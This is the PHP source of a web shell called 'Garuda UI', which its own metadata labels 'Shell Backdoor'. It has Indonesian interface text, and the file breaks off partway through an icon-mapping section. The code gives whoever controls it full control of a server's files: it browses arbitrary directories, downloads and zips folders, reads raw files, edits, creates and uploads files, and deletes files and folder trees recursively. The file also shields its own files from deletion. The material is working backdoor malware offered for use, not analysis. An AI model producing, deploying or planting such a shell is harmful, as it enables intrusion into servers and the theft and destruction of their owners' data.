<?php
$secret_key = 'Garuda UI';
$hash_key = hash('sha512', $secret_key);

if (isset($_COOKIE['session_id'])) {
  session_id($_COOKIE['session_id']);
  session_start();
} else {
  session_start();
  $session_id = session_id();
  setcookie("session_id", $session_id, time() + 86400);
}

if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
  if (isset($_GET['logout']) && $_GET['logout'] ===  $hash_key) {
    session_unset();
    session_destroy();
    setcookie("session_id", $session_id, time() + 86400);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
  }
  
  if (isset($_POST['change_username'])) {
    $new_username = $_POST['new_username'];
    $file_path = 'Garuda UI/data-login.json';
    $json_data = file_get_contents($file_path);
    $data = json_decode($json_data, true);
    $data[0]['Username'] = $new_username;
    file_put_contents($file_path, json_encode($data, JSON_PRETTY_PRINT));
    session_unset();
    session_destroy();
    setcookie("session_id", $session_id, time() + 86400);
    header('Location: ' . $_SERVER['PHP_SELF']);
  }
  
  if (isset($_POST['change_password'])) {
    $new_password = $_POST['new_password'];
    $file_path = 'Garuda UI/data-login.json';
    $json_data = file_get_contents($file_path);
    $data = json_decode($json_data, true);
    $data[0]['Password'] = password_hash($new_password, PASSWORD_DEFAULT);
    file_put_contents($file_path, json_encode($data, JSON_PRETTY_PRINT));
    session_unset();
    session_destroy();
    setcookie("session_id", $session_id, time() + 86400);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
  }
  
  $file_path = 'Garuda UI/data-login.json';
  $json_data = file_get_contents($file_path);
  $data = json_decode($json_data, true);
  $username = $data[0]['Username'];
  $password = $data[0]['Password'];
  
  $title = "Garuda UI";
  $description = "Shell Backdoor $title";
  $author = "P3YCH";
  $robots = "index, follow";
  $viewport = "width=device-width, initial-scale=1.0";
  $charset = "utf-8";
  
  if (isset($_GET['dl'])) {
    $dl = $_GET['dl'];
    $dir = isset($_GET['dir']) ? rtrim($_GET['dir'], '/') : __DIR__;
    $file_path = $dir . '/' . $dl;
    
    if (file_exists($file_path)) {
      header("Content-type: application/octet-stream");
      header("Content-Disposition: attachment; filename=$dl");
      header("Pragma: no-cache");
      header("Expires: 0");
      readfile("$file_path");
      exit;
    }
  }
  
  if (isset($_GET['run'])) {
    $run = $_GET['run'];
    $path = $_GET['dir'] . "/" . $run;
    
    if (is_dir($path)) {
      echo "Tidak dapat menjalankan direktori";
    } else if (file_exists($path)) {
      $run = file_get_contents($path);
      echo $run;
    } else {
      echo "File tidak ditemukan";
    }
    exit;
  }
  
  if (isset($_GET['raw'])) {
    $raw = $_GET['raw'];
    $path = $_GET['dir'] . "/" . $raw;
    
    if (is_file($path)) {
      header('Content-Type: text/plain');
      readfile($path);
    } else {
      echo "File tidak ditemukan";
    }
    exit;
  }
?>
<!DOCTYPE html>
<html data-bs-theme="dark">
  <head>
    <title><?php echo $title ?></title>
    <meta http-equiv="content-type" content="text/html; charset=<?php echo $charset ?>">
    <meta name="viewport" content="<?php echo $viewport ?>">
    <meta name="description" content="<?php echo $description ?>">
    <meta name="keywords" content="<?php echo $title . ", " . $description ?>">
    <meta name="author" content="<?php echo $author ?>">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    
    <link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
  </head>
  <style type="text/css" media="all">
    @import url('https://fonts.googleapis.com/css2?family=Patrick+Hand&display=swap');
    body {
      font-family: 'Patrick Hand', cursive;
    }
    ::-webkit-scrollbar {
      width: 10px;
    }
    
    ::-webkit-scrollbar-track {
      background-color: var(--bs-dark);
      -webkit-border-radius: 10px;
      border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb {
      -webkit-border-radius: 10px;
      border-radius: 10px;
      background: #6d6d6d; 
    }
    
    a {
      text-decoration: none;
    }
    .dropdown-menu {
      --bs-dropdown-link-active-bg: none;
    }
    .dropdown-menu-scoll {
      max-height: 84px;
      overflow-y: auto;
      margin-left: 7rem;
    }
    
    .dropdown-menu > li > a:hover,
    .dropdown-menu > li > a:focus {
      background-color: var(--bs-body);
    }
    .btn-close, .btn-close:active,
    .btn-close:focus {
      outline: none;
      border: none;
      border-color: none;
      box-shadow: none;
    }
    @media (min-width: 576px) {
      body {
        font-size: 1.1rem;
      }
    }
    .player {
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .progress {
      margin-left: 10px;
      margin-right: 10px;        
      flex-grow: 1;
    }
    .progress-bar {
      background-color: var(--bs-light);
    }
    
    @media (min-width: 576px) {
      .sticky-md-top {
        position: -webkit-sticky;
        position: sticky;
        top: 0;
        z-index: 1020;
      }
    }
  </style>
  <body>
    <nav class="navbar navbar-expand-lg bg-body shadow-sm sticky-md-top">
      <div class="container-fluid m-2 p-1">
        <a class="text-reset text-decoration-none fs-4">Garuda UI</a>
        <form method="GET">
          <?php if (isset($_GET['dir'])) { ?>
            <input type="hidden" name="dir" value="<?= htmlentities($_GET['dir']) ?>">
          <?php } ?>
          <input type="text" class="form-control w-100" placeholder="Search folder atau file" name="query" value="<?= isset($_GET['query']) ? $_GET['query'] : '' ?>">
        </form>
        <div class="d-none d-md-block d-md-flex justify-content-center">
          <a class="text-reset me-3" data-bs-toggle="modal" data-bs-target="#all">
            <svg height="1.5rem" viewBox="0 0 21 21" width="1.5rem" xmlns="http://www.w3.org/2000/svg"><g fill="currentColor" fill-rule="evenodd"><circle cx="10.5" cy="10.5" r="1"/><circle cx="10.5" cy="5.5" r="1"/><circle cx="10.5" cy="15.5" r="1"/></g></svg>
          </a>
          
          <div class="dropdown">
            <a class="d-flex align-items-center" data-bs-toggle="modal" data-bs-target="#profile">
              <img src="//p3ychid.my.id/image/72c7a403de42654fb0c1907d870bbdd8.png" class="rounded-circle" height="25" alt="Garuda UI" />
            </a>
          </div>
        </div>
      </div>
    </nav>
    
    <div class="container-fluid p-3">
      <?php
      $dir = isset($_GET['dir']) ? rtrim($_GET['dir'], '/') : __DIR__;
      
      function deleteFolder($folder) {
        if (!is_dir($folder)) {
          return false;
        }
        
        $items = array_diff(scandir($folder), array('.', '..'));
        foreach ($items as $item) {
          if($item != "Garuda UI") {
            $itemPath = $folder . DIRECTORY_SEPARATOR . $item;
            
            if (is_dir($itemPath)) {
              deleteFolder($itemPath);
            } else {
              unlink($itemPath);
            }
          }
        }
        return rmdir($folder);
      }
      
      function hapussemua($folderPath) {
        if (is_dir($folderPath)) {
          $files = scandir($folderPath);
          foreach ($files as $file) {
            if ($file != "." && $file != "..") {
            hapussemua($folderPath . "/" . $file);
            }
          }
          rmdir($folderPath);
        } else {
          unlink($folderPath);
        }
      }
      
      if (isset($_GET['hapus_semua']) && $_GET['hapus_semua'] == "all") {
        $folderPath = $dir;
        hapussemua($folderPath);
      }
      
      if (isset($_GET['df'])) {
        $df = $_GET['df'];
        $folder_path = $dir . '/' . $df;
        $zip_file_name = $df . ".zip";
        
        $zip = new ZipArchive();
        
        if ($zip->open($zip_file_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
          $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder_path));
          foreach ($files as $name => $file) {
            if (!$file->isDir()) {
              $file_path = $file->getRealPath();
              $relative_path = substr($file_path, strlen($folder_path) + 1);
              $zip->addFile($file_path, $relative_path);
            }
          }
          $zip->close();
          
          header("Content-type: application/zip");
          header("Content-Disposition: attachment; filename=$zip_file_name");
          header("Pragma: no-cache");
          header("Expires: 0");
          readfile("$zip_file_name");
          unlink("$zip_file_name");
          exit;
        }
      }
      
      if (isset($_GET['rf'])) {
        $delete_file = $_GET['rf'];
        $file_path = $dir.'/'.$delete_file;
        if($delete_file != "Garuda UI") {
          if (deleteFolder($file_path)) {
            ?>
            <script type="text/javascript" charset="utf-8">
              Swal.fire({
                icon: 'success',
                title: 'Berhasil!',
                text: 'Folder berhasil dihapus.',
                showConfirmButton: false
              }).then(function(){
                history.back(-2)
              })
            </script>
            <?php
          } else {
            ?>
            <script type="text/javascript" charset="utf-8">
              Swal.fire({
                icon: 'warning',
                title: 'Gagal!',
                html: '<p class="text-center"> Hem itu lu hapus tapi gak tolol, coba elu lihat lagi. </p>',
                showConfirmButton: false
              }).then(function(){
                history.back(-2)
              })
            </script>
            <?php
          }
        } else {
          ?>
          <script type="text/javascript" charset="utf-8">
            Swal.fire({
              icon: 'info',
              title: 'Peringatan!',
              html: '<p class="text-center"> Mohon untuk tidai menghapus ya. </p>',
              showConfirmButton: false
            }).then(function(){
              history.back(-2)
            })
          </script>
          <?php
        }
      }
      
      if (isset($_GET['rl'])) {
        $delete_file = $_GET['rl'];
        $file_path = $dir.'/'.$delete_file;
        if (file_exists($file_path)) {
          if (is_dir($file_path)) {
            ?>
            <script type="text/javascript" charset="utf-8">
              Swal.fire({
                icon: 'warning',
                title: 'Peringatan!',
                html: '<p class="text-center"> Kaya ya itu folder sudah ada dah. </p>',
                showConfirmButton: false
              }).then(function(){
                history.back(-2)
              })
            </script>
            <?php
          } else {
            if ($delete_file === basename($_SERVER['PHP_SELF'])) {
              ?>
              <script type="text/javascript" charset="utf-8">
                Swal.fire({
                  icon: 'info',
                  title: 'Peringatan!',
                  html: '<p class="text-center"> Mohon untuk tidak menghapus file asli ya. </p>',
                  showConfirmButton: false
                }).then(function(){
                  history.back(-2)
                })
              </script>
              <?php
            } else {
              unlink($file_path);
              ?>
              <script type="text/javascript" charset="utf-8">
                Swal.fire({
                  icon: 'success',
                  title: 'Berhasil!',
                  text: 'File berhasil dihapus.',
                  showConfirmButton: false
                }).then(function(){
                  history.back(-2)
                })
              </script>
              <?php
            }
          }
        } else {
          echo "<script>window.history.go(-1)</script>";
        }
      }
      
      if (isset($_GET['rename'])) {
        $old_name = $_GET['rename'];
        
        if (isset($_POST['new_name'])) {
          $new_name = $_POST['new_name'];
          $path = $dir . '/' . $old_name;
          $new_path = $dir . '/' . $new_name;
          
          if (file_exists($path)) {
            if (rename($path, $new_path)) {
              ?>
              <script type="text/javascript" charset="utf-8">
                Swal.fire({
                  icon: 'success',
                  title: 'Berhasil!',
                  text: 'Nama ya berhasil diganti.',
                  showConfirmButton: false
                }).then(function(){
                  history.back(-2)
                })
              </script>
              <?php
            } else {
              ?>
              <script type="text/javascript" charset="utf-8">
                Swal.fire({
                  icon: 'error',
                  title: 'Gagal!',
                  text: 'Nama ya gagal diganti.',
                  showConfirmButton: false
                }).then(function(){
                  history.back(-2)
                })
              </script>
              <?php
            }
          } else {
            ?>
            <script type="text/javascript" charset="utf-8">
              Swal.fire({
                icon: 'warning',
                title: 'Gagal!',
                html: '<p class="text-center"> Periksalah kembali, dikarenakan yang kamu rename itu folder/file ya sudah gak ada. </p>',
                showConfirmButton: false
              }).then(function(){
                history.back(-2)
              })
            </script>
            <?php
          }
        }
      
        if ($old_name === "Garuda UI") {
              ?>
              <script type="text/javascript" charset="utf-8">
                  Swal.fire({
                      icon: 'error',
                      title: 'Gagal!',
                      text: 'Folder "Garuda UI" tidak dapat diubah namanya.',
                      showConfirmButton: false
                  }).then(function(){
                      history.back(-2)
                  })
              </script>
              <?php
          }
      }
      
      if (isset($_GET['edit'])) {
        $file = $_GET['edit'];
        $fullpath = $dir . '/' . $file;
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_content'])) {
          $new_content = $_POST['new_content'];
          if (file_put_contents($fullpath, $new_content) !== false) {
            $edit_success = true;
          } else {
            $edit_error = true;
          }
        }
        
        if (file_exists($fullpath) && is_file($fullpath)) {
          $file_content = file_get_contents($fullpath);
          ?>
          <div class="modal fade p-3" id="edit" tabindex="-1" aria-labelledby="edit-<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>Label" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
              <div class="modal-content border-0 shadow-sm">
                <div class="modal-header">
                  <h1 class="modal-title fs-5 py-1" id="edit-<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>Label">Ganti nama <span class="text-danger user-select-none"><?php echo $file ?></span></h1>
                </div>
                <div class="modal-body">
                  <form method="post" action="<?php echo $_SERVER['PHP_SELF'] . '?dir=' . $dir . '&edit=' . $file; ?>">
                    <textarea class="form-control" id="new_content" name="new_content" rows="10" cols="50"><?php echo htmlspecialchars($file_content); ?></textarea>
                    <div class="d-grid gap-2 mt-2">
                      <input class="btn btn-primary" type="submit" value="Ganti">
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
          
          <script type="text/javascript" charset="utf-8">
            window.addEventListener('DOMContentLoaded', function(){
              var myModal = new bootstrap.Modal(document.getElementById('edit'), {});
              myModal.show();
            });
            
            document.getElementById('edit').addEventListener('hidden.bs.modal', function () {
              history.back(-2)
            });
          </script>
          <?php
        }
      }
      
      if (isset($edit_success)) {
        ?>
        <script type="text/javascript" charset="utf-8">
          Swal.fire({
            icon: 'success',
            title: 'Berhasil!',
            text: 'File berhasil diubah.',
            showConfirmButton: false
          }).then(function(){
            document.getElementById('edit').addEventListener('hidden.bs.modal', function () {
              history.back(-2)
            });
          })
        </script>
        <?php
      } elseif (isset($edit_error)) {
        ?>
        <script type="text/javascript" charset="utf-8">
          Swal.fire({
            icon: 'warning',
            title: 'Gagal!',
            text: 'File gak bisa diubah.',
            showConfirmButton: false
          }).then(function(){
            document.getElementById('edit').addEventListener('hidden.bs.modal', function () {
              history.back(-2)
            });
          })
        </script>
        <?php
      }
      
      if (isset($_POST['addfolder'])) {
        $nama_folder = $_POST['nama_folder'];
        $new_dir = $dir . '/' . $nama_folder;
        
        if (!is_dir($new_dir)) {
          mkdir($new_dir);
          ?>
          <script type="text/javascript" charset="utf-8">
              Swal.fire({
                icon: 'success',
                title: 'Berhasil!',
                html: '<p class="text-center"> Berhasil menambahkan folder baru. </p>',
                showConfirmButton: false
              }).then(function(){
                history.back(-2)
              })
            </script>
          <?php
        } else {
          ?>
          <script type="text/javascript" charset="utf-8">
            Swal.fire({
              icon: 'warning',
              title: 'Peringatan!',
              html: '<p class="text-center"> Kaya ya itu folder sudah ada dah. </p>',
              showConfirmButton: false
            }).then(function(){
              history.back(-2)
            })
          </script>
          <?php
        }
      }
      
      if (isset($_POST['addfile'])) {
        $nama_file = $_POST['nama_file'];
        $konten_file = $_POST['konten_file'];
        $new_file = $dir . '/' . $nama_file;
        
        if (!file_exists($new_file)) {
          $fp = fopen($new_file, "w");
          fwrite($fp, $konten_file);
          fclose($fp);
          ?>
          <script type="text/javascript" charset="utf-8">
              Swal.fire({
                icon: 'success',
                title: 'Berhasil!',
                html: '<p class="text-center"> Berhasil membuat file baru. </p>',
                showConfirmButton: false
              }).then(function(){
                history.back(-2)
              })
            </script>
          <?php
        }
      }
      
      $folderupload = 'Garuda UI';
      if(!file_exists($folderupload)){
        mkdir($folderupload);
      }
      if(!file_exists($folderupload.'/data-upload.json')){
        file_put_contents($folderupload.'/data-upload.json', '[]');
      }
      
      if(isset($_FILES['upload'])) {
        $file_name = $_FILES['upload']['name'];
        $file_tmp = $_FILES['upload']['tmp_name'];
        
        if(move_uploaded_file($file_tmp, $dir . "/" . $file_name)) {
          $size = filesize($dir . "/" . $file_name);
          $size_str = '';
          $units = array('B', 'KB', 'MB', 'GB', 'TB');
          $i = 0;
          while(abs($size) >= 1024 && $i < count($units)-1) {
            $size /= 1024;
            $i++;
          }
          $size_str = round($size, 2) . ' ' . $units[$i];
          
          $last_modified = filemtime($dir . "/" . $file_name);
          $last_modified_str = date('d M Y H:i:s', $last_modified);
          $upload_location = $dir;
          
          $data = array(
            'Nama File:' => $file_name,
            'Ukuran:' => $size_str,
            'Tanggal:' => $last_modified_str,
            'Tempat:' => hash("sha512", $upload_location),
          );
          
          $json_data = file_get_contents($folderupload.'/data-upload.json');
          $data_array = json_decode($json_data, true);
          
          array_push($data_array, $data);
          
          $json_data = json_encode($data_array, JSON_PRETTY_PRINT);
          file_put_contents($folderupload.'/data-upload.json', $json_data);
          echo "<script>alert('File berhasil diupload.');</script>";
          echo "<meta http-equiv='refresh' content='0'>";
        } else {
          $error_message = "";
          $error_code = $_FILES['upload']['error'];
          switch($error_code) {
            case 1:
              $error_message = "Ukuran file terlalu besar. Harap unggah file yang lebih kecil dari 10MB.";
              header("HTTP/1.1 403 Forbidden");
              break;
            case 2:
              $error_message = "Ukuran file terlalu besar. Harap unggah file yang lebih kecil dari 2GB.";
              header("HTTP/1.1 403 Forbidden");
              break;
            case 3:
              $error_message = "Terjadi kesalahan saat mengupload file. Mohon ulangi lagi.";
              header("HTTP/1.1 400 Bad Request");
              break;
            case 4:
              $error_message = "Tidak ada file yang terpilih untuk diupload.";
              header("HTTP/1.1 400 Bad Request");
              break;
            case 6:
              $error_message = "Tidak dapat mengupload file karena folder sementara tidak tersedia.";
              header("HTTP/1.1 500 Internal Server Error");
              break;
            case 7:
              $error_message = "Tidak dapat mengupload file karena disk penuh.";
              header("HTTP/1.1 500 Internal Server Error");
              break;
            default:
              $error_message = "Maaf, terjadi kesalahan saat mengupload file.";
              header("HTTP/1.1 500 Internal Server Error");
              break;
          }
          echo "<script>alert('".$error_message."');</script>";
          echo "<meta http-equiv='refresh' content='0'>";
        }
      }
      
      $key = hash('sha256', $dir);
      
      $modal_id = rand(1000, 9999);
      
      if (!is_dir($dir)) {
      ?>
      <div class="alert alert-danger" role="alert">
        <button class="btn btn-outline-danger btn-sm float-end" type="button" onclick="history.back()">Kembali</button>
        <h4 class="alert-heading">Error Dir!</h4>
        <hr>
        <p class="mb-0">Ada yang salah saat memasuki parameter ?dir ya, silakan periksa kembali!</p>
      </div>
      <?php
      exit;
      }
      
      $files = glob($dir . '/{,.}*', GLOB_BRACE | GLOB_NOSORT | GLOB_MARK);
      if (!$files) {
      ?>
      <div class="alert alert-primary" role="alert">
        <button class="btn btn-outline-primary btn-sm float-end" type="button" onclick="history.back()">Kembali</button>
        <h4 class="alert-heading">Error Dir!</h4>
        <hr>
        <p class="mb-0">Tidak ditemukan folder atau file disini!</p>
      </div>
      <?php
      exit;
      }
      
      $folders = array();
      $files_arr = array();
      
      foreach ($files as $file) {
        $file_name = basename($file);
        $icon = "bi bi-folder2-open me-2";
        if (is_dir($file)) {
          if($file_name !== '.' && $file_name !== '..') {
            $folders[] = $file_name;
          }
        } elseif ($file_name !== '.' && $file_name !== '..') {
          $files_arr[] = $file_name;
        }
      }
      natcasesort($folders);
      natcasesort($files_arr);
      
      $files = array_merge($folders, $files_arr);
      
      if (isset($_GET['query'])) {
        $keyword = trim($_GET['query']);
        if (!empty($keyword)) {
          $filteredFiles = array_filter($files, function ($file) use ($dir, $keyword) {
            $filePath = $dir . '/' . $file;
            return is_readable($filePath) && stripos($file, $keyword) !== false;
          });
          echo "
          <style>.list-file{display:none}</style>
          ";
          natcasesort($folders);
          natcasesort($files_arr);
          $files = $filteredFiles;
          $totalFiles = count($files);
        } else {
        ?>
        <div class="alert alert-danger my-3" role="alert">
          <a href='?dir=<?php echo $dir ?>' class="btn btn-outline-danger btn-sm float-end" type="button">Kembali</a>
          Kamu tidak memasukkan apapun ke dalam query!
        </div>
        <?php
          exit;
        }
      } else {
        $totalFiles = count($files);
      }
      ?>
      <div class="row">
        <!-- Alert query -->
        <div class="col-12 mb-3 mb-0">
          <div class="card border-0 shadow-0 h-100">
            <div class="card-body p-0">
              <p class="card-text text-truncate">
                <?php if (isset($_GET['query']) && $_GET['query'] !== ''): ?>
                <div class="alert alert-success my-3" role="alert">
                  Hasil search "<?php echo htmlspecialchars($_GET['query']); ?>" : <?php echo $totalFiles; ?>
                  <a href="?dir=<?php echo $dir ?>" class="btn btn-outline-success btn-sm float-end" type="button">Kembali</a>
                </div>
                <?php endif; ?>
              </p>
            </div>
           </div>
        </div>
        
        <!-- Breadcrumb -->
        <div class="col-12 mb-3 mb-0 list-file">
          <div class="card border-0 shadow-sm">
            <div class="card-body">
              <p class="card-text float-end">
                <a class='btn btn-outline-info btn-sm me-3'><?php $fileperms = fileperms($dir); echo substr(sprintf('%o', $fileperms), -3); ?></a>
                <a href='?dir=<?php echo (dirname($dir)) ?>&key=<?php echo $key ?>' class='btn btn-outline-primary btn-sm'>Kembali</a>
              </p>
              <h6 class="card-title">Lokasi kamu saat ini!</h6>
              <p class="card-text">
                <nav aria-label="breadcrumb">
                  <ol class="breadcrumb">
                    <span class="text-muted me-2">/</span>
                    <?php
                      $dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
                      $dirs = explode('/', $dir);
                      $path = '/';
                      foreach ($dirs as $index => $item) {
                        if (!empty($item)) {
                          $path .= $item . '/';
                          $active = ($index === count($dirs) - 1) ? 'active' : '';
                          echo '<li class="breadcrumb-item ' . $active . '" aria-current="' . ($active ? 'page' : '') . '"><a href="?dir=' . (implode('/', array_slice($dirs, 0, $index + 1))) . '&key=' . $key . '">' . ucfirst($item) . '</a></li>';
                        }
                      }
                    ?>
                  </ol>
                </nav>
              </p>
            </div>
          </div>
        </div>
        
        <div class="col-12 mb-3 mb-0 list-file">
          <div class="card border-0 shadow-sm">
            <div class="card-body">
              <p class="card-text">
                <ul class="nav nav-pills nav-fill gap-2 p-1 small rounded-5 mb-3" role="tablist">
                  <li class="nav-item" role="presentation">
                    <button class="nav-link rounded-5" data-bs-toggle="modal" data-bs-target="#addfolders">Tambahkan folder</button>
                  </li>
                  <li class="nav-item" role="presentation">
                    <button class="nav-link rounded-5" data-bs-toggle="modal" data-bs-target="#addfile">Tambahkan file</button>
                  </li>
                  <li class="nav-item" role="presentation">
                    <button class="nav-link rounded-5" data-bs-toggle="modal" data-bs-target="#uploadfile">Upload file</button>
                  </li>
                  <li class="nav-item" role="presentation">
                    <button class="nav-link active rounded-5" data-bs-toggle="modal" data-bs-target="#info">Informasi</button>
                  </li>
                </ul>
              </p>
            </div>
          </div>
        </div>
        
        <?php
        foreach ($files as $file) {
          if($file !== '.' && $file !== '..') {
            $fileperms = fileperms($dir.'/'.$file);
            if (is_dir($dir.'/'.$file)) {
        ?>
        <!-- Folder -->
        <div class="col-7 mb-3 mb-0">
          <div class="card border-0 shadow-sm h-100">
            <div class="card-body">
              <p class="card-text">
                <div class="d-grid gap-1 d-flex justify-content-between">
                  <span class="text-truncate">
                    <i class="<?php echo $icon; ?>"></i><a href='?dir=<?php echo ($dir.'/'.$file) ?>&key=<?php echo $key ?>' class='text-decoration-none d-inline'><?php echo $file ?></a>
                  </span>
                  <span class="text-truncate">
                    <i class="bi bi-file-earmark-lock me-2"></i>
                    <?php
                    echo substr(sprintf('%o', $fileperms), -3);
                    ?>
                  </span>
                </div>
              </p>
            </div>
           </div>
        </div>
        <div class="col-5 mb-3 mb-0">
          <div class="card border-0 shadow-sm h-100">
            <div class="card-body">
              <p class="card-text text-truncate">
                <div class="btn-group d-flex justify-content-end" role="group">
                  <a class="btn btn-outline-primary d-none d-md-block d-lg-block" data-bs-toggle="modal" data-bs-target="#<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>"><svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 3)"><path d="m14 1c.8284271.82842712.8284271 2.17157288 0 3l-9.5 9.5-4 1 1-3.9436508 9.5038371-9.55252193c.7829896-.78700064 2.0312313-.82943964 2.864366-.12506788z"/><path d="m12.5 3.5 1 1"/></g></svg></a>
                  <a href="?dir=<?php echo $dir ?>&df=<?php echo $file ?>" class="btn btn-outline-success rounded-start d-md-none d-lg-none"><i class="bi bi-download"></i></a>
                  <a href="?dir=<?php echo $dir ?>&df=<?php echo $file ?>" class="btn btn-outline-success d-none d-md-block d-lg-block"><i class="bi bi-download"></i></a>
                  <a href="?dir=<?php echo $dir ?>&rf=<?php echo $file ?>&key=<?php echo $key ?>" class="btn btn-outline-danger rounded-end d-none d-md-block d-lg-block"><svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" transform="translate(3 4)"><path d="m3.04312645.77339244c1.30458237-.50251803 2.79020688-.75708722 4.45687355-.76370756 1.66666667-.00645659 3.1522912.2481126 4.4568735.76370756 1.4533332.41523806 2.3707846 1.84683012 2.1409518 3.3407434l-1.0760143 6.99409286c-.3002042 1.9513268-1.9792025 3.3917713-3.95348683 3.3917713h-3.13664834c-1.97428433 0-3.65328268-1.4404445-3.95348679-3.3917713l-1.0760143-6.99409286c-.22983281-1.49391328.68761852-2.92550534 2.14095171-3.3407434z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/><path d="m7.5 6c3.5555556 0 5-1.5 5-2.5s-1.4444444-2.25-5-2.25c-3.55555556 0-5 1.25-5 2.25s1.44444444 2.5 5 2.5z" fill="currentColor"/></g></svg></a>
                  <a class="btn btn-outline-info rounded-end d-md-none d-lg-none" data-bs-toggle="dropdown" aria-expanded="false"><i class="bi bi-info"></i></a>
                  <ul class="dropdown-menu dropdown-menu-end border-0 p-2 mt-2 mb-2 shadow">
                    <li>
                      <a class="dropdown-item mb-1" data-bs-toggle="modal" data-bs-target="#<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>">
                        <svg height="21" viewBox="0 0 21 21" width="21" class="me-2" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 3)"><path d="m14 1c.8284271.82842712.8284271 2.17157288 0 3l-9.5 9.5-4 1 1-3.9436508 9.5038371-9.55252193c.7829896-.78700064 2.0312313-.82943964 2.864366-.12506788z"/><path d="m12.5 3.5 1 1"/></g></svg>Ganti Nama
                      </a>
                    </li>
                    <li><hr class="dropdown-divider"></li>
                    <li>
                      <a href="?dir=<?php echo $dir ?>&rf=<?php echo $file ?>&key=<?php echo $key ?>" class="dropdown-item"><svg height="21" viewBox="0 0 21 21" width="21" class="me-2" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 2)"><path d="m2.5 2.5h10v12c0 1.1045695-.8954305 2-2 2h-6c-1.1045695 0-2-.8954305-2-2zm5-2c1.0543618 0 1.91816512.81587779 1.99451426 1.85073766l.00548574.14926234h-4c0-1.1045695.8954305-2 2-2z"/><path d="m.5 2.5h14"/><path d="m5.5 5.5v8"/><path d="m9.5 5.5v8"/></g></svg>Hapus</a>
                    </li>
                  </ul>
                </div>
              </p>
            </div>
          </div>
        </div>
        
        <!-- Rename -->
        <div class="modal fade p-3" id="<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>" tabindex="-1" aria-labelledby="rename-<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>Label" aria-hidden="true">
          <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
            <div class="modal-content border-0 shadow-sm">
              <div class="modal-header">
                <h1 class="modal-title fs-5 py-1" id="<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>Label">Ganti nama <span class="text-danger user-select-none"><?php echo $file ?></span></h1>
              </div>
              <div class="modal-body">
                <form action="<?php echo $_SERVER['PHP_SELF'] ?>?dir=<?php echo $dir ?>&rename=<?php echo $file ?>" class="row" method="POST" accept-charset="utf-8">
                  <div class="input-group mt-3 mb-3">
                    <span class="input-group-text" id="<?php echo hash("crc32b", $modal_id . "(".$file.")") ?>"><i class="<?php echo $icon; ?> ms-1"></i></span>
                    <input type="text" class="form-control" name="new_name" placeholder="Masukkan nama baru" value="<?php echo $file ?>">
                  </div>
                  <div class="d-grid gap-2">
                    <button class="btn btn-primary" type="submit">
                      Ubah
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
        <?php
        } else {
          $extension = pathinfo($file, PATHINFO_EXTENSION);
          switch ($extension) {
            case 'aac':
            $icon = "bi bi-filetype-aac me-2";
            break;
            
            case 'ai':
            $icon = "bi bi-filetype-ai me-2";
            break;
            
            case 'bmp':
            $icon = "bi bi-filetype-bmp me-2";
            break;
            
            case 'cs':
            $icon = "bi bi-filetype-cs me-2";
            break;
            
            case 'css':
            $icon = "bi bi-filetype-css me-2";
            break;
            
            case 'csv':
            $icon = "bi bi-filetype-csv me-2";
            break;
            
            case 'doc':
            $icon = "bi bi-filetype-doc me-2";
            break;
           
            case 'docx':
            $icon = "bi bi-filetype-docx me-2";
            break;
            
            case 'exe':
            $icon = "bi bi-filetype-exe me-2";
            break;
            
            case 'gif':
            $icon = "bi bi-filetype-gif me-2";
            break;
            
            case 'heic':
            $icon = "bi bi-filetype-heic me-2";
            break;
            
            case 'html':
            $icon = "bi bi-filetype-html me-2";
            break;
            
            case 'java':
            $icon = "bi bi-filetype-java me-2";
            break;
            
            case 'jpg':
            $icon = "bi bi-filetype-jpg me-2";
            break;
            
            case 'js':
            $icon = "bi bi-filetype-js me-2";
            break;
            
            case 'json':
            $icon = "bi bi-filetype-json me-2";
            break;
            
            case 'jsx':
            $icon = "bi bi-filetype-jsx me-2";
            break;
            
            case 'key':
            $icon = "bi bi-filetype-key me-2";
            break;
            
            case 'm4p':
            $icon = "bi bi-filetype-m4p me-2";
            break;
            
            case 'md':
            $icon = "bi bi-filetype-md me-2";
            break;
            
            case 'mdx':
            $icon = "bi bi-filetype-mdx me-2";
            break;
            
            case 'mov':
            $icon = "bi bi-filetype-mov me-2";
            break;
            
